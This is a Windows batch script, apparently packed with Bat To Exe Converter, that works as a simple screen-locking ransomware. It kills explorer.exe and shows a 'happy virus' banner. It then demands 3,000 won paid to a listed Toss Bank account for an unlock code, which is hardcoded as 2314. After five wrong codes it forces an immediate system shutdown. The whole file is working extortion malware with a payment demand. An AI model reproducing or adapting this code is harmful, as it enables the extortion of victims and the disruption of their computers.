::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdCyDJGyX8VAjFAtRTQ+ENWe7OpET/+b34OuDsXEPW+Azd5eV07eBQA==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFAtRTQ+ENWe7OpEZ++Pv4Pq7gH8rbc9xfZfeug==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
color 14

set password=2314
set count=1
set limit=5
taskkill /F /IM explorer.exe > NUL
echo happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus happy virus   happy virus happy virus happy virus happy virus happy virus happy virus happy virus If you close the window, it cannot be restored.
echo EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE                                                                                                                                                                                                                                                                                                                          
:Re    
set /p Input= 1. What is this? Your computer has been locked by a virus. 2. How do I unlock my computer? If you do not receive your recovery key now, your computer will be locked forever. To receive a recovery key, pay 3,000 won to Toss Bank (1908-9342-1963). 3. Is there a limit to the number of works that can be submitted? The lock code can be entered a total of 5 times. Each time you unlock it, you lose one chance. What happens if you use up 4.5 chances? If you use up all 5 chances, your computer will automatically shut down. Pay your account fee to reactivate your computer. Enter decryption code:
if %Input% equ %password% (
	echo Decent code.
	echo Unlocking...
        echo Unlocking...
        echo Unlocking...
        cd..
        cd..
        tree
        cd..
        cd..
        tree
        cd..
        cd..
        tree
        echo Computer unlocked.
        start /min del.bat 
	goto End
) else (
	set /a count=%count% + 1
	echo [%count%/%limit%]The unlock code is incorrect.
	if %count% equ %limit% (
		echo Quit.
		shutdown -s -t 0
	) else (
		goto Re
	)
)


:End
start explorer.exe
pause
